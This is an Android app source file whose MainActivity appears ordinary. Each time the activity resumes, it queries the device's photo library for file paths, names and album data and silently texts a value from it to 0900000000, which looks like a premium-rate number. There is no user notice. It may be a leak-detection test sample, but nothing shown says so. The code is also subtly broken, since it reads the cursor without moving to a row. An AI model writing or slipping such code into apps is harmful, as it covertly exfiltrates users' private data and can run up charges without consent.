package com.example.contentprovideraccess;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;

public class MainActivity extends Activity
{
	private final static String LOG_TAG = MainActivity.class.getName();
	@Override
	protected void onResume()
	{
		ContentResolver resolver = getContentResolver();
		Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
		String[] cols = new String[7];
        cols[0] = "_id";
        cols[1] = "bucket_id";
        cols[2] = "bucket_display_name";
        cols[3] = "_data";
        cols[4] = "datetaken";
        cols[5] = "_display_name";
        cols[6] = "_size";
		Cursor cursor = null;
		try
		{	
			cursor = resolver.query(uri, cols, null, null, null);
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("0900000000", null, cursor.getString(0), null, null);
		}
		finally
		{
			if(cursor != null)
			{
				try
				{
					cursor.close();
				}
				catch(Exception ex)
				{}
			}
		}
	}
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
	}
}
